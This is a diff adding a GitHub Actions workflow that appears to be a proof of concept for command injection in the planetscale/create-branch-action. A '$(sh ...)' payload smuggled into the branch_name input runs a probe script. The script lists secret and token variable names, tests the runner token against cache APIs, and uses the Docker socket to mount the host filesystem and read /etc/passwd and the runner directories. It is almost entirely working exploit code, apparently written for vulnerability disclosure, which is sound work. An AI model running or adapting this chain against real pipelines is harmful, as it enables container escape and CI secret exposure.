@@ -1,0 +1,108 @@
+name: poc3-escape
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  escape:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Write probe script
+        run: |
+          cat > probe.sh <<'PROBE'
+          #!/bin/sh
+          # RCE-E escalation probe. Runs INSIDE the action container where the command
+          # injection fires. STRICTLY READ-ONLY w.r.t. host/docker state: only inspects
+          # the socket, queries the daemon, and reads host files through a read-only bind
+          # mount. Token VALUES are never printed, names only.
+          TAG="${1:-x}"
+          OUT="/github/workspace/escape_${TAG}.txt"
+          SOCK=/var/run/docker.sock
+          
+          {
+          echo "########## PROBE tag=${TAG} $(date -u 2>/dev/null) ##########"
+          echo "== id =="; id
+          echo "== os-release =="; cat /etc/os-release 2>&1
+          echo "== container hostname =="; cat /etc/hostname 2>&1
+          echo "== /var/run listing =="; ls -la /var/run/ 2>&1 | head -40
+          echo "== docker.sock stat =="; ls -la "$SOCK" 2>&1; (stat "$SOCK" 2>&1 || echo "stat unavailable")
+          echo "== docker cli =="; command -v docker 2>&1 || echo "no docker cli"
+          echo "== daemon GET /version =="; curl -s --max-time 8 --unix-socket "$SOCK" http://localhost/version 2>&1
+          echo
+          echo "== daemon GET /containers/json =="; curl -s --max-time 8 --unix-socket "$SOCK" http://localhost/containers/json 2>&1
+          echo
+          echo "== daemon GET /images/json (repo tags) =="; curl -s --max-time 8 --unix-socket "$SOCK" http://localhost/images/json 2>&1 | tr '{' '\n' | grep -o '"RepoTags":\[[^]]*\]' | head -30
+          echo
+          echo "== env var NAMES visible to injected process =="; env | sed 's/=.*//' | sort | tr '\n' ' '; echo
+          echo "== token/capability var NAMES present =="; env | sed 's/=.*//' | grep -E 'TOKEN|SECRET|KEY|CACHE|RESULT|RUNTIME' | sort | tr '\n' ' '; echo
+          echo "== workspace .git/config auth header present (value withheld) =="
+          if [ -f /github/workspace/.git/config ]; then
+            if grep -q 'extraheader' /github/workspace/.git/config 2>/dev/null; then
+              echo "PRESENT: .git/config carries an http.extraheader auth entry (value withheld)"
+            else
+              echo "absent: no extraheader in .git/config"
+            fi
+          else
+            echo "no /github/workspace/.git/config"
+          fi
+          
+          echo "== token capability probes (read-only queries) =="
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            C1=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_CACHE_URL/_apis/artifactcache/cache?keys=probe&version=probe" 2>/dev/null)
+            echo "cache(v1) GET ${ACTIONS_CACHE_URL}/_apis/artifactcache/cache -> HTTP ${C1}"
+          else
+            echo "ACTIONS_CACHE_URL empty"
+          fi
+          if [ -n "$ACTIONS_RESULTS_URL" ]; then
+            R1=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H 'Content-Type: application/json' -X POST -d '{"key":"probe","restoreKeys":[],"version":"probe"}' "$ACTIONS_RESULTS_URL/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" 2>/dev/null)
+            echo "results cache twirp GetCacheEntryDownloadURL -> HTTP ${R1}"
+          else
+            echo "ACTIONS_RESULTS_URL empty"
+          fi
+          
+          echo "########## STAGE 2: host read via read-only container ##########"
+          VER=$(curl -s --max-time 8 --unix-socket "$SOCK" http://localhost/version 2>/dev/null)
+          case "$VER" in
+            *ApiVersion*)
+              echo "daemon reachable: $VER"
+              IMG=$(curl -s --max-time 8 --unix-socket "$SOCK" http://localhost/images/json 2>/dev/null | tr '{' '\n' | grep -o '"Id":"sha256:[a-f0-9]*"' | head -1 | sed 's/.*"\(sha256:[a-f0-9]*\)".*/\1/')
+              echo "image selected: ${IMG:-none}"
+              if [ -n "$IMG" ]; then
+                CJSON=$(curl -s --max-time 10 --unix-socket "$SOCK" -H 'Content-Type: application/json' -X POST -d @- http://localhost/containers/create 2>&1 <<EOF
+          {"Image":"${IMG}","Entrypoint":["sh","-c"],"Cmd":["echo HOST_NAME:; cat /host/etc/hostname; echo; echo HOST_PASSWD_HEAD:; head -12 /host/etc/passwd; echo; echo HOST_DOCKER_DATA_DIR:; ls /host/var/lib/docker 2>&1 | head -20; echo; echo HOST_RUNNER_HOME:; ls /host/home/runner 2>&1 | head -20; echo; echo HOST_RUNNER_WORK:; ls /host/home/runner/work 2>&1 | head"],"Tty":true,"AttachStdout":true,"AttachStderr":true,"HostConfig":{"Binds":["/:/host:ro"],"ReadonlyRootfs":true,"NetworkMode":"none"}}
+          EOF
+          )
+                CID=$(echo "$CJSON" | sed -n 's/.*"Id":"\([a-f0-9]\{12,\}\)".*/\1/p' | head -1)
+                echo "create response: $(echo "$CJSON" | head -c 300)"
+                echo "container id: ${CID:-none}"
+                if [ -n "$CID" ]; then
+                  echo "start: $(curl -s --max-time 10 -o /dev/null -w '%{http_code}' --unix-socket "$SOCK" -X POST "http://localhost/containers/$CID/start" 2>&1)"
+                  sleep 3
+                  echo "== host read output =="
+                  curl -s --max-time 10 --unix-socket "$SOCK" "http://localhost/containers/$CID/logs?stdout=1&stderr=1&tail=200" 2>&1 | tr -cd '\11\12\15\40-\176'
+                fi
+              fi
+              ;;
+            *) echo "daemon did not answer /version; stage 2 skipped" ;;
+          esac
+          echo "########## PROBE END tag=${TAG} ##########"
+          } >> "$OUT" 2>&1
+          exit 0
+          PROBE
+          chmod +x probe.sh
+          ls -la probe.sh
+      - name: create-branch-action escape probe
+        uses: planetscale/create-branch-action@allow-duplicates
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'x$(sh /github/workspace/probe.sh branch)end'
+          check_exists: "true"
+      - name: Print evidence
+        run: |
+          echo "--- escape_branch.txt ---"
+          cat escape_branch.txt || echo "no file"
